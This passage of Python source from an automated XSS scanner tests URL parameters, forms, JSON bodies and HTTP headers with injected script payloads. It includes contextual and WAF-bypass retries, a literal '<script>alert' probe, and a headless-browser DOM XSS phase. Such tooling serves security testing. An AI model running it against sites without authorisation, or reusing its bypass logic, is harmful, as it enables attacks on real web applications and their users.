                            vuln_manager.mark_as_exploited(base_url, param)
                            vuln_manager.mark_as_exploited(base_url, base_url_only=True)
                            with stdout_lock:
                                print_vulnerability(f"\033[1;32m[{method_label}] [VULNERABLE]\033[0m {base_url}?{param}={quote(winning_payload)}")
                            entry = f"{base_url}?{param}={quote(winning_payload)}"
                            if method_label not in ("GET", "POST"):
                                entry += f"|||BYPASS_TECHNIQUE:{method_label}|||BYPASS_ORIGINAL:{quote(payload)}"
                            urls_vulnerables.append(entry)
                            return True
                    return False

                # ── CAPA 1: detección directa ──────────────────────────────
                if r.status_code == 200 and is_xss_response(r.text, payload) and r.text != baseline:
                    if payload in r.text or urllib.parse.unquote(payload) in r.text:
                        if _report_xss_post(payload):
                            found += 1
                            with lock:
                                current += 1
                                update_progress(current, total)
                            return

                # ── CAPA 2: bypass contextual ──────────────────────────────
                elif r.status_code == 200 and _XSS_MARKER in r.text and r.text != baseline:
                    context = _detect_xss_context(r.text)
                    bypass_list = _xss_bypass_payloads_for(context, r.headers)
                    for bp in bypass_list:
                        bp_data = {p: "TEST123" for p in qs}
                        bp_data[param] = bp
                        try:
                            rb = session.post(base_url, data=bp_data, verify=False, timeout=5, allow_redirects=True)
                            if rb.status_code == 200 and is_xss_response(rb.text, bp, context) and rb.text != baseline:
                                if _report_xss_post(bp, f"POST-BYPASS[{context}]"):
                                    found += 1
                                    with lock:
                                        current += 1
                                        update_progress(current, total)
                                    return
                        except Exception:
                            continue

                # ── CAPA 3: WAF ────────────────────────────────────────────
                elif r.status_code in (403, 406, 429):
                    waf = _detect_waf(r)
                    if waf:
                        for wp in _XSS_WAF_BYPASS_PAYLOADS[:3]:
                            wp_data = {p: "TEST123" for p in qs}
                            wp_data[param] = wp
                            try:
                                rw = session.post(base_url, data=wp_data, verify=False, timeout=5, allow_redirects=True)
                                if rw.status_code == 200 and is_xss_response(rw.text, wp) and rw.text != baseline:
                                    if _report_xss_post(wp, f"POST-WAF-BYPASS[{waf}]"):
                                        found += 1
                                        with lock:
                                            current += 1
                                            update_progress(current, total)
                                        return
                            except Exception:
                                continue

            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue

        with lock:
            current += 1
            update_progress(current, total)

    def test_form(url, payload):
        request_throttle(__import__("urllib.parse", fromlist=["urlparse"]).urlparse(url).netloc)
        nonlocal current, found
        try:
            headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
            
            # Crear sesión segura con manejo de bloqueos si está disponible
            if BLOCK_HANDLER_AVAILABLE:
                session = create_safe_request_session(headers)
            else:
                session = requests.Session()
                session.headers.update(headers)
            
            # Cache de formularios para evitar re-parsing
            if url not in form_cache:
                r = session.get(url, timeout=7)
                soup = BeautifulSoup(r.text, "html.parser")
                forms = soup.find_all("form")
                form_cache[url] = forms
            else:
                forms = form_cache[url]
                
            for form in forms:
                action = form.get("action")
                method = form.get("method", "get").lower()
                inputs = form.find_all("input")
                data = {}

                for i in inputs:
                    name = i.get("name")
                    if name:
                        data[name] = payload

                if not data:
                    continue

                full_url = urljoin(url, action) if action else url

                # URL normalizada para dedup: sin tracking params
                norm_url = _strip_tracking_params(full_url)
                form_base = f"{urlparse(norm_url).scheme}://{urlparse(norm_url).netloc}{urlparse(norm_url).path}"

                # Saltar si este endpoint ya fue explotado
                if vuln_manager.should_skip_url(form_base, base_url_only=True):
                    continue

                # Cache de baseline para formularios
                baseline_key = f"{method}-{norm_url}-{','.join(data.keys())}"
                if baseline_key not in baseline_cache:
                    try:
                        baseline_data = {k: "TEST123" for k in data}
                        if method == "post":
                            r = session.post(full_url, data=baseline_data, timeout=5)
                        else:
                            r = session.get(full_url, params=baseline_data, timeout=5)

                        if r.status_code == 200:
                            baseline_cache[baseline_key] = r.text
                        else:
                            baseline_cache[baseline_key] = ""
                    except requests.exceptions.Timeout:
                        baseline_cache[baseline_key] = ""
                    except requests.exceptions.RequestException:
                        baseline_cache[baseline_key] = ""
                    except Exception:
                        baseline_cache[baseline_key] = ""

                baseline = baseline_cache[baseline_key]
                if not baseline:
                    continue

                form_domain = urlparse(full_url).netloc
                if ban.is_banned(form_domain):
                    continue

                if method == "post":
                    res = session.post(full_url, data=data, timeout=5)
                else:
                    res = session.get(full_url, params=data, timeout=5)
                ban.record(form_domain, res.status_code, res, full_url)

                def _report_xss_form(winning_payload, winning_data, label="FORM"):
                    form_param_key = ','.join(sorted(winning_data.keys()))
                    _parsed = urlparse(norm_url)
                    form_base = f"{_parsed.scheme}://{_parsed.netloc}{_parsed.path.lower()}"
                    dedup_key = f"{form_base}|{form_param_key}"
                    with lock:
                        if dedup_key in vuln_set:
                            return False
                        vuln_set.add(dedup_key)
                    # Marcar en vuln_manager para que otros scanners lo skippeen
                    for p_name in winning_data:
                        vuln_manager.mark_as_exploited(form_base, p_name)
                    vuln_manager.mark_as_exploited(form_base, base_url_only=True)
                    with stdout_lock:
                        encoded_data = {k: urllib.parse.quote_plus(v) for k, v in winning_data.items()}
                        print_vulnerability(f"\033[1;32m[{label}] [VULNERABLE]\033[0m {norm_url}" + "\033[1;32m ==> \033[0m" + f"{encoded_data}")
                    # Para GET: URL = form_base?param=payload (para que el PoC abra la URL correcta)
                    # Para POST: URL = form_base (payload va en el body del form)
                    if method == "get":
                        qs = urllib.parse.urlencode({k: winning_payload for k in winning_data})
                        entry_url = f"{form_base}?{qs}"
                    else:
                        entry_url = form_base
                    entry = f"{method.upper()}|{entry_url} => {winning_data}"
                    if label != "FORM":
                        entry += f"|||BYPASS_TECHNIQUE:{label}|||BYPASS_ORIGINAL:{quote(payload)}"
                    urls_vulnerables.append(entry)
                    return True

                # ── CAPA 1: detección directa ──────────────────────────────
                if res.status_code == 200 and is_xss_response(res.text, payload) and res.text != baseline:
                    if _report_xss_form(payload, data):
                        found += 1

                # ── CAPA 2: bypass contextual (marker presente pero escapado) ─
                elif res.status_code == 200 and _XSS_MARKER in res.text and res.text != baseline:
                    context = _detect_xss_context(res.text)
                    bypass_list = _xss_bypass_payloads_for(context, res.headers)
                    for bp in bypass_list:
                        bp_data = {k: bp for k in data}
                        try:
                            if method == "post":
                                rb = session.post(full_url, data=bp_data, timeout=5)
                            else:
                                rb = session.get(full_url, params=bp_data, timeout=5)
                            if rb.status_code == 200 and is_xss_response(rb.text, bp, context) and rb.text != baseline:
                                if _report_xss_form(bp, bp_data, f"FORM-BYPASS[{context}]"):
                                    found += 1
                                    break
                        except Exception:
                            continue

                # ── CAPA 3: WAF ────────────────────────────────────────────
                elif res.status_code in (403, 406, 429):
                    waf = _detect_waf(res)
                    if waf:
                        for wp in _XSS_WAF_BYPASS_PAYLOADS[:3]:
                            wp_data = {k: wp for k in data}
                            try:
                                if method == "post":
                                    rw = session.post(full_url, data=wp_data, timeout=5)
                                else:
                                    rw = session.get(full_url, params=wp_data, timeout=5)
                                if rw.status_code == 200 and is_xss_response(rw.text, wp) and rw.text != baseline:
                                    if _report_xss_form(wp, wp_data, f"FORM-WAF-BYPASS[{waf}]"):
                                        found += 1
                                        break
                            except Exception:
                                continue
        except requests.exceptions.Timeout:
            pass  # Skip timeouts silently
        except requests.exceptions.RequestException:
            pass  # Skip other request errors
        except Exception:
            pass  # Skip any other errors

        with lock:
            current += 1
            update_progress(current, total)

    def test_json_xss(url, payload):
        """Prueba XSS vía JSON body. Soporta endpoints con y sin query params."""
        request_throttle(__import__("urllib.parse", fromlist=["urlparse"]).urlparse(url).netloc)
        nonlocal current, found
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        qs = parse_qs(parsed.query)

        if _is_static_path(url):
            with lock:
                current += 1
                update_progress(current, total)
            return

        if vuln_manager.should_skip_url(base_url, base_url_only=True):
            with lock:
                current += 1
                update_progress(current, total)
            return

        headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
        domain = parsed.netloc

        if not _probe_accepts_json(base_url, headers):
            with lock:
                current += 1
                update_progress(current, total)
            return

        if ban.is_banned(domain):
            with lock:
                current += 1
                update_progress(current, total)
            return

        json_headers = dict(headers)
        json_headers["Content-Type"] = "application/json"

        fields_to_test = list(qs.keys()) if qs else _JSON_COMMON_FIELDS

        for param in fields_to_test:
            if _is_non_injectable_param(param):
                continue

            baseline_key = f"JSON-{base_url}-{param}"
            if baseline_key not in baseline_cache:
                try:
                    data = {p: "TEST123" for p in qs}
                    rb = requests.post(base_url, json=data, headers=json_headers,
                                       verify=False, timeout=5)
                    baseline_cache[baseline_key] = rb.text if rb.status_code == 200 else ""
                except Exception:
                    baseline_cache[baseline_key] = ""
            baseline = baseline_cache[baseline_key]

            if not baseline:
                continue

            data = {p: "TEST123" for p in qs}
            data[param] = payload

            try:
                r = requests.post(base_url, json=data, headers=json_headers,
                                  verify=False, timeout=5, allow_redirects=True)
                ban.record(domain, r.status_code, r, base_url)

                def _report_json_xss(win_payload, label="JSON-POST"):
                    if not vuln_manager.is_already_exploited(base_url, param):
                        if not vuln_manager.verify_false_positive(
                            base_url, win_payload, label, custom_headers, random_agent
                        ):
                            vuln_manager.mark_as_exploited(base_url, param)
                            vuln_manager.mark_as_exploited(base_url, base_url_only=True)
                            with stdout_lock:
                                print_vulnerability(
                                    f"\033[1;32m[{label}] [VULNERABLE]\033[0m "
                                    f"{base_url} \033[2m(field: {param})\033[0m"
                                )
                            entry = f"{base_url}?{param}={quote(win_payload)}|||JSON_BODY:true"
                            if label not in ("JSON-POST",):
                                entry += f"|||BYPASS_TECHNIQUE:{label}"
                            urls_vulnerables.append(entry)
                            return True
                    return False

                # CAPA 1: detección directa
                if r.status_code == 200 and is_xss_response(r.text, payload) and r.text != baseline:
                    if payload in r.text or urllib.parse.unquote(payload) in r.text:
                        if _report_json_xss(payload):
                            found += 1
                            break

                # CAPA 2: bypass contextual (marker reflejado pero payload modificado)
                elif r.status_code == 200 and _XSS_MARKER in r.text and r.text != baseline:
                    context = _detect_xss_context(r.text)
                    for bp in _xss_bypass_payloads_for(context, r.headers):
                        bp_data = {p: "TEST123" for p in qs}
                        bp_data[param] = bp
                        try:
                            rb2 = requests.post(base_url, json=bp_data, headers=json_headers,
                                                verify=False, timeout=5)
                            if rb2.status_code == 200 and is_xss_response(rb2.text, bp, context):
                                if _report_json_xss(bp, f"JSON-BYPASS[{context}]"):
                                    found += 1
                                    break
                        except Exception:
                            continue

                # CAPA 3: WAF bypass
                elif r.status_code in (403, 406, 429):
                    waf = _detect_waf(r)
                    if waf:
                        for wp in _XSS_WAF_BYPASS_PAYLOADS[:3]:
                            wp_data = {p: "TEST123" for p in qs}
                            wp_data[param] = wp
                            try:
                                rw = requests.post(base_url, json=wp_data, headers=json_headers,
                                                   verify=False, timeout=5)
                                if rw.status_code == 200 and is_xss_response(rw.text, wp):
                                    if _report_json_xss(wp, f"JSON-WAF-BYPASS[{waf}]"):
                                        found += 1
                                        break
                            except Exception:
                                continue

            except requests.exceptions.Timeout:
                continue
            except requests.exceptions.RequestException:
                continue
            except Exception:
                continue

        with lock:
            current += 1
            update_progress(current, total)

    def test_headers_xss(url, payload):
        """Prueba XSS inyectando el payload en headers HTTP comunes."""
        request_throttle(__import__("urllib.parse", fromlist=["urlparse"]).urlparse(url).netloc)
        nonlocal current, found
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if _is_static_path(url) or vuln_manager.should_skip_url(base_url, base_url_only=True):
            with lock:
                current += 1
                update_progress(current, total)
            return

        if ban.is_banned(parsed.netloc):
            with lock:
                current += 1
                update_progress(current, total)
            return

        base_headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)

        for hdr in _XSS_INJECTABLE_HEADERS:
            if vuln_manager.should_skip_url(base_url, base_url_only=True):
                break
            try:
                injected_h = dict(base_headers)
                injected_h[hdr] = payload
                r = requests.get(base_url, headers=injected_h, verify=False, timeout=5)
                ban.record(parsed.netloc, r.status_code, r, base_url)

                if r.status_code not in (200, 400, 404, 500):
                    continue

                # Verificar reflexión del payload en el response (sin encoding)
                # Usar el mismo marcador único del scanner HTTP para evitar FPs
                marker = f"neluxXSS{abs(hash(base_url)) % 9999}"
                probe_h = dict(base_headers)
                probe_h[hdr] = f'<script>alert("{marker}")</script>'
                rp = requests.get(base_url, headers=probe_h, verify=False, timeout=5)
                if marker in rp.text:
                    vuln_url = f"{base_url}?__header_{hdr}__={quote(probe_h[hdr], safe='')}"
                    if vuln_url not in found_urls:
                        with lock:
                            found_urls.add(vuln_url)
                        vuln_manager.mark_as_exploited(base_url, base_url_only=True)
                        with stdout_lock:
                            print_vulnerability(
                                f"\033[1;32m[HEADER-XSS][REFLECTED]\033[0m "
                                f"{base_url} \033[2m(header: {hdr})\033[0m"
                            )
                        entry = f"{base_url}?__header_{hdr}__={quote(probe_h[hdr], safe='')}|||BYPASS_TECHNIQUE:HEADER-XSS"
                        urls_vulnerables.append(entry)
                        found.append(entry)
                    break
            except Exception:
                continue

        with lock:
            current += 1
            update_progress(current, total)

    def _iter_xss_tasks():
        for url in urip:
            for payload in wordlist:
                yield (test_url, url, payload)
                yield (test_json_xss, url, payload)
        for url in urif:
            for payload in wordlist:
                yield (test_form, url, payload)
                yield (test_json_xss, url, payload)
        # Header injection: top-3 payloads por endpoint único
        seen_bases_xss = set()
        for url in urip + urif:
            pxss = urlparse(url)
            base_xss = f"{pxss.scheme}://{pxss.netloc}{pxss.path}"
            if base_xss not in seen_bases_xss:
                seen_bases_xss.add(base_xss)
                for payload in wordlist[:3]:
                    yield (test_headers_xss, url, payload)

    try:
        run_threadpool_pending_bounded(_iter_xss_tasks(), threads)
    except KeyboardInterrupt:
        from parametizer.interrupt import is_interrupted
        if is_interrupted():
            return
        raise

    # Limpiar salida fase HTTP
    with stdout_lock:
        sys.stdout.write('\r' + ansi.clear_line())
        sys.stdout.flush()

    # ── Fase DOM XSS (Playwright headless) ────────────────────────────────────
    # Construye el set de bases ya encontradas en fase HTTP para no duplicar.
    http_found_bases: set = set()
    for vuln_url in list(urls_vulnerables):
        try:
            p0 = urlparse(vuln_url.split(" =>")[0].strip())
            http_found_bases.add(f"{p0.scheme}://{p0.netloc}{p0.path}")
        except Exception:
            pass

    dom_workers = max(1, min(_DOM_XSS_MAX_WORKERS, threads))
    print(f'\033[1;36m[*] DOM XSS phase (headless Chromium, {dom_workers} parallel workers)...\033[0m')
    dom_results = _dom_xss_batch(urip, http_found_bases, custom_headers, threads=dom_workers)

    dom_found = 0
    for (dom_url, dom_param, dom_payload) in dom_results:
        dom_parsed = urlparse(dom_url)
        dom_base = f"{dom_parsed.scheme}://{dom_parsed.netloc}{dom_parsed.path}"
        if not vuln_manager.is_already_exploited(dom_base, dom_param):
            vuln_manager.mark_as_exploited(dom_base, dom_param)
            vuln_manager.mark_as_exploited(dom_base, base_url_only=True)
            print_vulnerability(
                f"\033[1;32m[DOM] [VULNERABLE]\033[0m {dom_url}"
            )
            urls_vulnerables.append(dom_url)
            found += 1
            dom_found += 1

    print()
    if found > 0:
        http_n = found - dom_found
        parts = []
        if http_n > 0:
            parts.append(f"{http_n} HTTP")
        if dom_found > 0:
            parts.append(f"{dom_found} DOM")
        print(f'\033[1;36m[+] Found {found} XSS vulnerabilities ({", ".join(parts)})\033[0m')
    else:
        print('\033[1;31m[-] No XSS vulnerabilities found\033[0m')
    print()

    return urls_vulnerables
